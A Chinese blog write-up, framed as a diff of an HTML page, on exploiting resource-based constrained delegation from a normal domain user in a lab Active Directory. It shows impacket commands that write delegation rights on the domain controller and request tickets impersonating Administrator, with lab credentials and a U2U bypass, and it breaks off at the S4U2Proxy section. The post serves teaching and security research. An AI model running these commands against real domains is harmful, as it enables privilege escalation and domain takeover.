@@ -1,0 +1,683 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="使用普通用户帐户远程利用 RBCD（基于资源委派）\r我是站在巨人们的肩膀上\r在这篇文章开始之前，我本来想详细解释一下rbcd，奈何Wagging the Dog写的文章已经足够全面了，这就像我这篇文章的主旋律一样，我吸取了0xdf这台phantom的知识，并且他把我引导到了James Forshaw这篇此文章基础的知识点。在我意识到0xdf的那台靶场环境存在限制并且James Forshaw并没有完全描述出远程攻击的利用手段，便有了这篇文章，就算你没有去看以上的文章，我也会尽可能让你理解使用普通用户帐户远程利用 RBCD\n从失败中找到答案\rWagging the Dog描述的很明确，当我们对本地计算机的域帐户具有写入访问权限，即可修改msDS-AllowedToActOnBehalfOfOtherIdentity属性以添加另一个帐户的 SID。之后就可以将该帐户与用户服务（S4U）协议一起使用，以获取本地计算机的 Kerberos 服务票证，作为域上的任何用户（包括本地管理员）进行票据认证\n正常的rbcd一般需要我们创建一台机器账户或者手中已经有了一台完全控制的机器账户，这样才能正常的对目标进行请求，要绕过这个限制，我们需要实践一下看看报错是如何产生的\n┌──(wackymaker㉿kali)-[~/test] └─$ cat start.sh ip=192.168.174.145 user=mrrobot pass=mrroboto12 domain=novice.com hash=c8fa8686516464c51cfc0bdc3e52ef9e FQDN=DC.novice.com 我在本地配置了如上环境，域用户mrrobot具备对dc$的GenericWrite的权限，以便我们可以配置rbcd的环境，我们先正常的将mrrobot写入DC$的msDS-AllowedToActOnBehalfOfOtherIdentity属性并尝试委派\n┌──(wackymaker㉿kali)-[~/test] └─$ impacket-rbcd -action write -delegate-to &#34;DC$&#34; -delegate-from &#34;$user&#34; $domain/$user:$pass -dc-ip $ip Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty [*] Delegation rights modified successfully! [*] mrrobot can now impersonate users on DC$ via S4U2Proxy [*] Accounts allowed to act on behalf of other identity: [*] MrRobot (S-1-5-21-3649830887-1815587496-1699028491-1104) ┌──(wackymaker㉿kali)-[~/test] └─$ impacket-getST -impersonate Administrator -spn cifs/DC.novice.com $domain/$user:$pass Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for user [*] Impersonating Administrator /usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() /usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [*] Requesting S4U2self [-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database) [-] Probably user mrrobot does not have constrained delegation permisions or impersonated user does not exist 可以看到我们写入属性是成功的，但是在请求委派的过程种遭到了报错\n">
+<title>使用普通用户帐户远程利用RBCD</title>
+
+<link rel='canonical' href='https://wackymaker.github.io/post/%E4%BD%BF%E7%94%A8%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8rbcd/'>
+
+<link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="使用普通用户帐户远程利用RBCD">
+<meta property='og:description' content="使用普通用户帐户远程利用 RBCD（基于资源委派）\r我是站在巨人们的肩膀上\r在这篇文章开始之前，我本来想详细解释一下rbcd，奈何Wagging the Dog写的文章已经足够全面了，这就像我这篇文章的主旋律一样，我吸取了0xdf这台phantom的知识，并且他把我引导到了James Forshaw这篇此文章基础的知识点。在我意识到0xdf的那台靶场环境存在限制并且James Forshaw并没有完全描述出远程攻击的利用手段，便有了这篇文章，就算你没有去看以上的文章，我也会尽可能让你理解使用普通用户帐户远程利用 RBCD\n从失败中找到答案\rWagging the Dog描述的很明确，当我们对本地计算机的域帐户具有写入访问权限，即可修改msDS-AllowedToActOnBehalfOfOtherIdentity属性以添加另一个帐户的 SID。之后就可以将该帐户与用户服务（S4U）协议一起使用，以获取本地计算机的 Kerberos 服务票证，作为域上的任何用户（包括本地管理员）进行票据认证\n正常的rbcd一般需要我们创建一台机器账户或者手中已经有了一台完全控制的机器账户，这样才能正常的对目标进行请求，要绕过这个限制，我们需要实践一下看看报错是如何产生的\n┌──(wackymaker㉿kali)-[~/test] └─$ cat start.sh ip=192.168.174.145 user=mrrobot pass=mrroboto12 domain=novice.com hash=c8fa8686516464c51cfc0bdc3e52ef9e FQDN=DC.novice.com 我在本地配置了如上环境，域用户mrrobot具备对dc$的GenericWrite的权限，以便我们可以配置rbcd的环境，我们先正常的将mrrobot写入DC$的msDS-AllowedToActOnBehalfOfOtherIdentity属性并尝试委派\n┌──(wackymaker㉿kali)-[~/test] └─$ impacket-rbcd -action write -delegate-to &#34;DC$&#34; -delegate-from &#34;$user&#34; $domain/$user:$pass -dc-ip $ip Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty [*] Delegation rights modified successfully! [*] mrrobot can now impersonate users on DC$ via S4U2Proxy [*] Accounts allowed to act on behalf of other identity: [*] MrRobot (S-1-5-21-3649830887-1815587496-1699028491-1104) ┌──(wackymaker㉿kali)-[~/test] └─$ impacket-getST -impersonate Administrator -spn cifs/DC.novice.com $domain/$user:$pass Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for user [*] Impersonating Administrator /usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() /usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [*] Requesting S4U2self [-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database) [-] Probably user mrrobot does not have constrained delegation permisions or impersonated user does not exist 可以看到我们写入属性是成功的，但是在请求委派的过程种遭到了报错\n">
+<meta property='og:url' content='https://wackymaker.github.io/post/%E4%BD%BF%E7%94%A8%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8rbcd/'>
+<meta property='og:site_name' content='wackymaker'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='域之魔法' /><meta property='article:published_time' content='2025-08-23T20:02:05&#43;08:00'/><meta property='article:modified_time' content='2025-08-23T20:02:05&#43;08:00'/>
+<meta name="twitter:title" content="使用普通用户帐户远程利用RBCD">
+<meta name="twitter:description" content="使用普通用户帐户远程利用 RBCD（基于资源委派）\r我是站在巨人们的肩膀上\r在这篇文章开始之前，我本来想详细解释一下rbcd，奈何Wagging the Dog写的文章已经足够全面了，这就像我这篇文章的主旋律一样，我吸取了0xdf这台phantom的知识，并且他把我引导到了James Forshaw这篇此文章基础的知识点。在我意识到0xdf的那台靶场环境存在限制并且James Forshaw并没有完全描述出远程攻击的利用手段，便有了这篇文章，就算你没有去看以上的文章，我也会尽可能让你理解使用普通用户帐户远程利用 RBCD\n从失败中找到答案\rWagging the Dog描述的很明确，当我们对本地计算机的域帐户具有写入访问权限，即可修改msDS-AllowedToActOnBehalfOfOtherIdentity属性以添加另一个帐户的 SID。之后就可以将该帐户与用户服务（S4U）协议一起使用，以获取本地计算机的 Kerberos 服务票证，作为域上的任何用户（包括本地管理员）进行票据认证\n正常的rbcd一般需要我们创建一台机器账户或者手中已经有了一台完全控制的机器账户，这样才能正常的对目标进行请求，要绕过这个限制，我们需要实践一下看看报错是如何产生的\n┌──(wackymaker㉿kali)-[~/test] └─$ cat start.sh ip=192.168.174.145 user=mrrobot pass=mrroboto12 domain=novice.com hash=c8fa8686516464c51cfc0bdc3e52ef9e FQDN=DC.novice.com 我在本地配置了如上环境，域用户mrrobot具备对dc$的GenericWrite的权限，以便我们可以配置rbcd的环境，我们先正常的将mrrobot写入DC$的msDS-AllowedToActOnBehalfOfOtherIdentity属性并尝试委派\n┌──(wackymaker㉿kali)-[~/test] └─$ impacket-rbcd -action write -delegate-to &#34;DC$&#34; -delegate-from &#34;$user&#34; $domain/$user:$pass -dc-ip $ip Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty [*] Delegation rights modified successfully! [*] mrrobot can now impersonate users on DC$ via S4U2Proxy [*] Accounts allowed to act on behalf of other identity: [*] MrRobot (S-1-5-21-3649830887-1815587496-1699028491-1104) ┌──(wackymaker㉿kali)-[~/test] └─$ impacket-getST -impersonate Administrator -spn cifs/DC.novice.com $domain/$user:$pass Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Getting TGT for user [*] Impersonating Administrator /usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() /usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [*] Requesting S4U2self [-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database) [-] Probably user mrrobot does not have constrained delegation permisions or impersonated user does not exist 可以看到我们写入属性是成功的，但是在请求委派的过程种遭到了报错\n">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_6baab66dae07af16.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">wackymaker</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/'
+                        target="_blank"
+                        title="Bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/wackymaker'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#我是站在巨人们的肩膀上">我是站在巨人们的肩膀上</a></li>
+    <li><a href="#从失败中找到答案">从失败中找到答案</a>
+      <ul>
+        <li><a href="#绕过s4u2self">绕过S4U2Self</a></li>
+        <li><a href="#s4u2proxy的限制以及绕过">S4U2Proxy的限制以及绕过</a></li>
+      </ul>
+    </li>
+    <li><a href="#攻击导致的结果以及需要的条件">攻击导致的结果以及需要的条件</a></li>
+    <li><a href="#快速攻击流程">快速攻击流程</a></li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/" >
+                域渗透
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/%E4%BD%BF%E7%94%A8%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8rbcd/">使用普通用户帐户远程利用RBCD</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 23, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    5 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="使用普通用户帐户远程利用-rbcd基于资源委派">使用普通用户帐户远程利用 RBCD（基于资源委派）
+</h1><h2 id="我是站在巨人们的肩膀上">我是站在巨人们的肩膀上
+</h2><p>在这篇文章开始之前，我本来想详细解释一下rbcd，奈何<a class="link" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html"  target="_blank" rel="noopener"
+    >Wagging the Dog</a>写的文章已经足够全面了，这就像我这篇文章的主旋律一样，我吸取了<a class="link" href="https://0xdf.gitlab.io/2025/08/19/htb-phantom.html#shell-as-administrator"  target="_blank" rel="noopener"
+    >0xdf</a>这台phantom的知识，并且他把我引导到了<a class="link" href="https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html"  target="_blank" rel="noopener"
+    >James Forshaw</a>这篇此文章基础的知识点。在我意识到0xdf的那台靶场环境存在限制并且James Forshaw并没有完全描述出远程攻击的利用手段，便有了这篇文章，就算你没有去看以上的文章，我也会尽可能让你理解使用普通用户帐户远程利用 RBCD</p>
+<h2 id="从失败中找到答案">从失败中找到答案
+</h2><p><a class="link" href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html"  target="_blank" rel="noopener"
+    >Wagging the Dog</a>描述的很明确，当我们对本地计算机的域帐户具有写入访问权限，即可修改msDS-AllowedToActOnBehalfOfOtherIdentity属性以添加另一个帐户的 SID。之后就可以将该帐户与用户服务（S4U）协议一起使用，以获取本地计算机的 Kerberos 服务票证，作为域上的任何用户（包括本地管理员）进行票据认证</p>
+<p>正常的rbcd一般需要我们创建一台机器账户或者手中已经有了一台完全控制的机器账户，这样才能正常的对目标进行请求，要绕过这个限制，我们需要实践一下看看报错是如何产生的</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/test<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat start.sh 
+</span></span><span style="display:flex;"><span>ip<span style="color:#f92672">=</span>192.168.174.145
+</span></span><span style="display:flex;"><span>user<span style="color:#f92672">=</span>mrrobot
+</span></span><span style="display:flex;"><span>pass<span style="color:#f92672">=</span>mrroboto12
+</span></span><span style="display:flex;"><span>domain<span style="color:#f92672">=</span>novice.com
+</span></span><span style="display:flex;"><span>hash<span style="color:#f92672">=</span>c8fa8686516464c51cfc0bdc3e52ef9e
+</span></span><span style="display:flex;"><span>FQDN<span style="color:#f92672">=</span>DC.novice.com
+</span></span></code></pre></div><p>我在本地配置了如上环境，域用户mrrobot具备对dc$的GenericWrite的权限，以便我们可以配置rbcd的环境，我们先正常的将mrrobot写入DC$的msDS-AllowedToActOnBehalfOfOtherIdentity属性并尝试委派</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/test<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-rbcd -action write -delegate-to <span style="color:#e6db74">&#34;DC</span>$<span style="color:#e6db74">&#34;</span> -delegate-from <span style="color:#e6db74">&#34;</span>$user<span style="color:#e6db74">&#34;</span> $domain/$user:$pass -dc-ip $ip
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Delegation rights modified successfully!
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> mrrobot can now impersonate users on DC$ via S4U2Proxy
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Accounts allowed to act on behalf of other identity:
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span>     MrRobot      <span style="color:#f92672">(</span>S-1-5-21-3649830887-1815587496-1699028491-1104<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/test<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-getST -impersonate Administrator -spn cifs/DC.novice.com $domain/$user:$pass
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Getting TGT <span style="color:#66d9ef">for</span> user
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Impersonating Administrator
+</span></span><span style="display:flex;"><span>/usr/share/doc/python3-impacket/examples/getST.py:380: DeprecationWarning: datetime.datetime.utcnow<span style="color:#f92672">()</span> is deprecated and scheduled <span style="color:#66d9ef">for</span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now<span style="color:#f92672">(</span>datetime.UTC<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  now <span style="color:#f92672">=</span> datetime.datetime.utcnow<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>/usr/share/doc/python3-impacket/examples/getST.py:477: DeprecationWarning: datetime.datetime.utcnow<span style="color:#f92672">()</span> is deprecated and scheduled <span style="color:#66d9ef">for</span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now<span style="color:#f92672">(</span>datetime.UTC<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  now <span style="color:#f92672">=</span> datetime.datetime.utcnow<span style="color:#f92672">()</span> + datetime.timedelta<span style="color:#f92672">(</span>days<span style="color:#f92672">=</span>1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting S4U2self
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Server not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Probably user mrrobot does not have constrained delegation permisions or impersonated user does not exist
+</span></span></code></pre></div><p>可以看到我们写入属性是成功的，但是在请求委派的过程种遭到了报错</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting S4U2self
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN<span style="color:#f92672">(</span>Server not found in Kerberos database<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>这段报错意味着请求过程在S4U2self阶段报错，原因在<a class="link" href="https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html"  target="_blank" rel="noopener"
+    >James Forshaw</a>的文章写的很清楚，kdc不清楚该使用何加密密钥，因为我们请求的用户并不具备spn，而一般的机器用户在创建的时候就会创建一系列自身的服务，也就是说自带spn，这里是一般我们只会使用机器账户进行委派的关键</p>
+<p>当我们请求S4U2Self的时候S4U2Self需要KDC能够找到目标主体的长期密钥（long-term key）来生成票据。这个长期密钥是每个域内账户都拥有的RC4-HMAC或AES加密的一个密钥，而spn的作用本质上是指向某个账户，所以本质上的流程是这样</p>
+<p>机器用户请求委派 → S4U2Self需要KDC提供一个可用于加密的长期密钥 → KDC依据我们提供的spn的绑定找到账户 → 用账户长期密钥加密票据 → 下一步</p>
+<p>所以我们的用户如果没有spn，KDC默认情况下是找不到一个可以利用的长期密钥的</p>
+<h3 id="绕过s4u2self">绕过S4U2Self
+</h3><p>这种情况我们有两种解决方式</p>
+<ol>
+<li>为用户添加spn（如果没有上级已经掌握用户对此用户存在通用写入及以上权限的情况下，域用户默认不允许修改自己的spn）</li>
+<li>通过<a class="link" href="https://datatracker.ietf.org/doc/html/draft-swift-win2k-krb-user2user-01"  target="_blank" rel="noopener"
+    >U2U</a>方式进行请求，强行指定KDC选择当前用户的长期密钥进行加密票据</li>
+</ol>
+<p>U2U（User-to-User）是Kerberos协议的一种扩展，用于在用户之间直接获取服务票据（TGS）而不依赖服务账户的长期密钥。如果服务支持 U2U，Kerberos可以使用目标用的 TGT（或者票据中的 session key）加密请求，直接生成服务票据，而不需要服务账户的明文密码或密钥</p>
+<p>当我们启用了u2u，请求流程就会变成如下</p>
+<p>域用户利用u2u请求委派 → S4U2Self需要KDC提供一个可用于加密的长期密钥 → KDC依据u2u直接找到目标（可指定，但这里我们一般使用自身） → 用目标账户长期密钥加密票据 → 下一步</p>
+<p>impacket包支持u2u的请求方式，让我们利用u2u进行尝试一次</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/test<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ impacket-getST -u2u -impersonate Administrator -spn cifs/DC.novice.com $domain/$user:$pass
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Getting TGT <span style="color:#66d9ef">for</span> user
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Impersonating Administrator
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting S4U2self+U2U
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting S4U2Proxy
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Kerberos SessionError: KDC_ERR_BADOPTION<span style="color:#f92672">(</span>KDC cannot accommodate requested option<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> Probably SPN is not allowed to delegate by user mrrobot or initial TGT not forwardable
+</span></span></code></pre></div><p>可以看到这里我们使用S4U2self+U2U进行了成功请求，但是在转发的时候被S4U2Proxy报错，报错提示了KDC_ERR_BADOPTION错误这几乎可以肯定是因为 KDC 无法解密 S4U2Proxy 请求中发送的票证。</p>
+<h3 id="s4u2proxy的限制以及绕过">S4U2Proxy的限制以及绕过
